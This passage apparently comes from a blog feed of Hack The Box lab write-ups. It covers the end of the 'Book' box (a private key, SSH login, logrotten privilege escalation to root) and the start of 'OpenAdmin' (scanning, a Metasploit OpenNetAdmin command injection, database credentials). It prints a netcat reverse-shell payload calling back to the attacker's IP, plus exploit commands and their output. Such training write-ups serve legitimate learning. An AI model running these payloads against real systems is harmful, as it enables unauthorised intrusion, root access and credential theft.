MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0 WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0 ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s 7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK 75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7 3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+ McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz 7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6 GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/ ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+ SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi 5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4= -----END RSA PRIVATE KEY----- user.txt Using the private key, we can ssh into the box. $ chmod 700 19868.txt $ ssh -i 19868.txt reader@book.htb reader@book:~$ cat user.txt 51c1XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) In the home directory was I first uploaded pspy to /tmp so that I could monitor for processes. reader@book:/tmp$ wget http://10.10.XX.XX/pspy --2020-07-11 11:40:51-- http://10.10.XX.XX/pspy Connecting to 10.10.XX.XX:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1090528 (1.0M) [application/octet-stream] Saving to: ‘pspy’ pspy 100%[===============================================================================================================================&amp;gt;] 1.04M 584KB/s in 1.8s 2020-07-11 11:40:54 (584 KB/s) - ‘pspy’ saved [1090528/1090528] reader@book:/tmp$ chmod +x pspy &amp;amp;&amp;amp; ./pspy ... 2020/07/11 11:50:22 CMD: UID=0 PID=48727 | /usr/sbin/logrotate -f /root/log.cfg logrotate was being ran from time to time as root and its version was outdated! reader@book:/tmp$ logrotate --version logrotate 3.11.0 Exploitation (2) According to this link, logrotate version 3.15.1 and below are vulnerable to an exploit called logrotten. reader@book:/tmp$ wget http://10.10.XX.XX/logrotten.c --2020-07-11 12:43:27-- http://10.10.14.7/logrotten.c Connecting to 10.10.14.7:80... connected. HTTP request sent, awaiting response... 200 OK Length: 5796 (5.7K) [text/plain] Saving to: ‘logrotten.c’ logrotten.c 100%[===============================================================================================================================&amp;gt;] 5.66K --.-KB/s in 0.006s 2020-07-11 12:43:27 (975 KB/s) - ‘logrotten.c’ saved [5796/5796] reader@book:/tmp$ gcc logrotten.c reader@book:/tmp$ gcc logrotten.c -o logrotten reader@book:/tmp$ ./logrotten usage: logrotten [OPTION...] &amp;lt;logfile&amp;gt; -h --help Print this help -t --targetdir &amp;lt;dir&amp;gt; Abosulte path to the target directory -p --payloadfile &amp;lt;file&amp;gt; File that contains the payload -s --sleep &amp;lt;sec&amp;gt; Wait before writing the payload -d --debug Print verbose debug messages -c --compress Hijack compressed files instead of created logfiles -o --open Use IN_OPEN instead of IN_MOVED_FROM To use logrotten, we need to prepare a script that will act as our payload. cat payloadfile rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.XX.XX 1337 &amp;gt;/tmp/f The above script creates a reverse shell connection back to us, so need to prepare a listener as well using nc. $ nc -lvnp 1337 listening on [any] 1337 ... Lastly, we will need to target a suitable log file that is configured to create a new copy of itself when rotated. Coincidentially, there was a access.log in /home/reader/backups/. Echoing a line into it causes it to rotate immediately! reader@book:~/backups$ ls -al total 8 drwxr-xr-x 2 reader reader 4096 Jul 11 13:58 . drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 .. -rw-r--r-- 1 reader reader 0 Jul 11 13:42 access.log reader@book:~/backups$ echo something &amp;gt;&amp;gt; access.log reader@book:~/backups$ ls -al total 12 drwxr-xr-x 2 reader reader 4096 Jul 11 13:59 . drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 .. -rw-r--r-- 1 reader reader 0 Jul 11 13:59 access.log -rw-r--r-- 1 reader reader 10 Jul 11 13:59 access.log.1 To execute logrotten successfully, I will need to start another ssh session that will echo the line into access.log while my current ssh session will execute logrotten. On current ssh session: reader@book:/tmp$ ./logrotten -p payloadfile /home/reader/backups/access.log Waiting for rotating /home/reader/backups/access.log... On another ssh session: reader@book:~/backups$ echo something &amp;gt;&amp;gt; access.log On current ssh session again: Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d Waiting 1 seconds before writing payload... Done! root.txt logrotten has successfully created a symbolic link of our payload to /etc/bash_completion.d, so now we just need to run /bin/bash to force the execution of our payload and voila, we caught the shell as root! connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.176] 49512 # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt 84daXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !</summary></entry><entry><title type="html">Hack The Box - OpenAdmin</title><link href="http://localhost:4000/hackthebox/opennetadmin/gtfobin/linux/2020/05/03/openadmin-htb.html" rel="alternate" type="text/html" title="Hack The Box - OpenAdmin" /><published>2020-05-03T05:27:00+03:00</published><updated>2020-05-03T05:27:00+03:00</updated><id>http://localhost:4000/hackthebox/opennetadmin/gtfobin/linux/2020/05/03/openadmin-htb</id><content type="html" xml:base="http://localhost:4000/hackthebox/opennetadmin/gtfobin/linux/2020/05/03/openadmin-htb.html">&lt;p&gt;&lt;img src=&quot;/assets/images/openadmin.png&quot; alt=&quot;&quot; height=&quot;414px&quot; width=&quot;615px&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;configuration&quot;&gt;Configuration&lt;/h1&gt;

&lt;p&gt;The operating systems that I will be using to tackle this machine is a Kali Linux VM.&lt;/p&gt;

&lt;p&gt;What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.10.10.171 openadmin.htb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h1&gt;

&lt;p&gt;Using &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, we are able to determine the open ports and running services on the machine.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; openadmin.htb
tarting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-01-10 11:35 EST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;openadmin.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.171&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.46s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                           
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http?
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;262.61 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;enumeration-1&quot;&gt;Enumeration (1)&lt;/h1&gt;

&lt;p&gt;Not much can be done with the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; service as we do not have any credentials on hand so lets come back to it later. As for the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service, maybe we can find some information on it ?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/openadmin1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing much here so lets bruteforce some directories using &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://openadmin.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 
...
/music &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/artwork &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/sierra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;There’s a few places to check out but lets take a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;/music&lt;/code&gt; first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/openadmin2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Mostly static pages but after much “crawling” around, I found &lt;code class=&quot;highlighter-rouge&quot;&gt;/ona&lt;/code&gt; by clicking on the “Login” button only on the index page?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/openadmin3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are presented with the UI for &lt;a href=&quot;https://opennetadmin.com/&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;OpenNetAdmin&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-raw&quot; data-lang=&quot;raw&quot;&gt;OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From the UI, we can see that the version of &lt;code class=&quot;highlighter-rouge&quot;&gt;OpenNetAdmin&lt;/code&gt; installed on the box is &lt;code class=&quot;highlighter-rouge&quot;&gt;v18.1.1&lt;/code&gt;. With that knowledge, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; to search for any possible exploit for this version.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;searchsploit OpenNetAdmin 18.1.1
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
 Exploit Title                                                                     |  Path
                                                                                   | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/usr/share/exploitdb/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
OpenNetAdmin 18.1.1 - Command Injection Exploit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                       | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                        | exploits/php/webapps/47691.sh
&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------------------------------&lt;/span&gt;
Shellcodes: No Result
Papers: No Result&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I will be using the &lt;code class=&quot;highlighter-rouge&quot;&gt;Metasploit&lt;/code&gt; module for this one.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfconsole
msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; search opennetadmin

Matching Modules
&lt;span class=&quot;o&quot;&gt;================&lt;/span&gt;

   &lt;span class=&quot;c&quot;&gt;#  Name                                                 Disclosure Date  Rank       Check  Description
&lt;/span&gt;
   -  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                 &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection

msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use  exploit/unix/webapp/opennetadmin_ping_cmd_injection
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unix/webapp/opennetadmin_ping_cmd_injection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS openadmin.htb
RHOSTS &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; openadmin.htb
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unix/webapp/opennetadmin_ping_cmd_injection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST tun0
LHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.XX.XX
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unix/webapp/opennetadmin_ping_cmd_injection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run 

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.XX.XX:4444 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exploiting...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Command Stager progress - 100.00% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;703/703 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exploit completed, but no session was created.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hmm no session? Lets use a 64-bit payload instead.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unix/webapp/opennetadmin_ping_cmd_injection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload linux/x64/meterpreter/reverse_tcp
payload &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; linux/x64/meterpreter/reverse_tcp
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unix/webapp/opennetadmin_ping_cmd_injection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run 

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.XX.XX:4444 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exploiting...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3012516 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 10.10.10.171
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Meterpreter session 1 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.XX.XX:4444 -&amp;gt; 10.10.10.171:48498&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-04-30 22:45:18 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Command Stager progress - 100.00% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;808/808 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; getuid
Server username: no-user @ openadmin &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33, &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33, &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33, &lt;span class=&quot;nv&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Alright, we got a foothold! Lets try spawning a &lt;code class=&quot;highlighter-rouge&quot;&gt;tty&lt;/code&gt; shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell
which python
which python3
python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
www-data@openadmin:/opt/ona/www&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Seems like we are in the web service’s directory.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@openadmin:/opt/ona/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;  1 www-data www-data  1970 Jan  3  2018 .htaccess.example
drwxrwxr-x  2 www-data www-data  4096 Jan  3  2018 config
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;  1 www-data www-data  1949 Jan  3  2018 config_dnld.php
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;  1 www-data www-data  4160 Jan  3  2018 dcm.php
drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 images
drwxrwxr-x  9 www-data www-data  4096 Jan  3  2018 include
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;  1 www-data www-data  1999 Jan  3  2018 index.php
drwxrwxr-x  5 www-data www-data  4096 Jan  3  2018 &lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;  1 www-data www-data  4526 Jan  3  2018 login.php
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;  1 www-data www-data  1106 Jan  3  2018 logout.php
drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 modules
drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 plugins
drwxrwxr-x  2 www-data www-data  4096 Jan  3  2018 winc
drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 workspace_plugins&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After some digging around, I only found database credentials in &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/ona/www/local/config/database_settings.inc.php&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/opt/ona/www/local/config/database_settings.inc.php
&amp;lt;?php

&lt;span class=&quot;nv&quot;&gt;$ona_contexts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;'DEFAULT'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
  array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;'databases'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
    array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
      0 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 
      array &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;s1&quot;&gt;'db_type'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mysqli'&lt;/span&gt;,
        &lt;span class=&quot;s1&quot;&gt;'db_host'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;,
        &lt;span class=&quot;s1&quot;&gt;'db_login'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ona_sys'&lt;/span&gt;,
        &lt;span class=&quot;s1&quot;&gt;'db_passwd'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'n1nj4W4rri0R!'&lt;/span&gt;,
        &lt;span class=&quot;s1&quot;&gt;'db_database'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ona_default'&lt;/span&gt;,
        &lt;span class=&quot;s1&quot;&gt;'db_debug'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;,
      &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
    &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
    &lt;span class=&quot;s1&quot;&gt;'description'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Default data context'&lt;/span&gt;,
    &lt;span class=&quot;s1&quot;&gt;'context_color'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#D3DBFF'&lt;/span&gt;,
  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Moving on, I went to check what users were on the box.&lt;/p&gt;

